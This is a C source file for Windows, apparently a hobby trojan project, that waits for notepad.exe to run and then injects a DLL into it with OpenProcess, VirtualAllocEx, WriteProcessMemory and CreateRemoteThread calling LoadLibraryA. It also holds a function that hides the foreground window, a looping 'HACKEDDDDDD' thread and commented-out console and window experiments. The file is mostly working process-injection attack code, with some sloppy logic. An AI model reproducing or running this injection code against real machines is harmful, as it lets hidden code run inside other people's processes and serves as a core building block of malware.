#include <Windows.h>
#include<stdio.h>
#include <tlhelp32.h>



LRESULT CALLBACK WindowProc(
	_In_ HWND   hwnd,
	_In_ UINT   uMsg,
	_In_ WPARAM wParam,
	_In_ LPARAM lParam
) {
	switch (uMsg)
	{
	case WM_CLOSE:
		MoveWindow(hwnd, 500,500,300,300,TRUE);
		return 0;
	case WM_SIZE:
		if (SIZE_MAXIMIZED) {
			MoveWindow(hwnd , 100,100,300,300,TRUE);
			return 0;
		}
	default:
		return DefWindowProc(hwnd, uMsg, wParam, lParam);
	}
	return 0;
}


DWORD WINAPI ThreadProc(
	_In_ LPVOID lpParameter
) {
	while (1)
		printf("HACKEDDDDDD");
	return 0;
}


int find_pid()
{
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (Process32First(snapshot, &entry) == TRUE)
	{
		while (Process32Next(snapshot, &entry) == TRUE)
		{
			if (strcmp(entry.szExeFile, "notepad.exe") == 0)
			{
				CloseHandle(snapshot);
				return entry.th32ProcessID;
			}
		}
	}

	CloseHandle(snapshot);

	return 0;
}
void Stealth()
{
	/*HWND Stealth;
	AllocConsole();
	Stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(Stealth, 0);*/
	HWND hWin = GetForegroundWindow();
	ShowWindow(hWin, SW_HIDE);
}
int WINAPI wWinMain(int argc, char** argv) {

#pragma region MyRegion
	/*HANDLE h_out = GetStdHandle(STD_OUTPUT_HANDLE);
const char* buffer = "ETHANNN\n";
DWORD written;
WriteConsole(h_out, buffer, strlen(buffer), &written, NULL);
HANDLE h_in = GetStdHandle(STD_INPUT_HANDLE);
INPUT_RECORD input[128];
DWORD toWrite , oldMode, nMode = ENABLE_LINE_INPUT;
GetConsoleMode(h_in, &oldMode);
SetConsoleMode(h_in, nMode);
ReadConsoleInput(h_in, input, 128 , &toWrite);
//*/
#pragma endregion
	
#pragma region MyRegion

	/*HWND hnd = CreateWindowA("STATIC", "WinsowName", WS_OVERLAPPED | WS_CAPTION |
		WS_SYSMENU | WS_THICKFRAME | WS_MINIMIZEBOX | WS_MAXIMIZEBOX | WS_VISIBLE,
		100, 100, 300, 300, NULL, NULL, NULL, NULL);
	SetWindowLongPtrA(hnd , GWLP_WNDPROC, (LONG_PTR)WindowProc);
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}*/

#pragma endregion

	//CreateThread(NULL, 0, ThreadProc, NULL, 0, NULL);
	//Stealth();
	int pid_notepad = find_pid();
	do {
		pid_notepad = find_pid();
	} while (pid_notepad == 0);
	if (pid_notepad != 0) {
		HANDLE hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid_notepad);

		LPVOID notepadMemoryPtr = VirtualAllocEx(hp, NULL, 100, MEM_COMMIT, PAGE_READWRITE);
		//char *buf = "C:\\Users\\Elie Barkate\\Documents\\myDLL2.dll";

		char *buf = "C:\\Users\\Ethan\\Desktop\\C\\TroySous_ETHAN\\x64\\Debug\\myDLL2.dll";
		int ret = WriteProcessMemory(hp, notepadMemoryPtr, buf, strlen(buf) + 1, NULL);
		DWORD tid;
		CreateRemoteThread(hp, NULL, 0, LoadLibraryA, notepadMemoryPtr, 0, &tid);
		
	}
	return 0;
}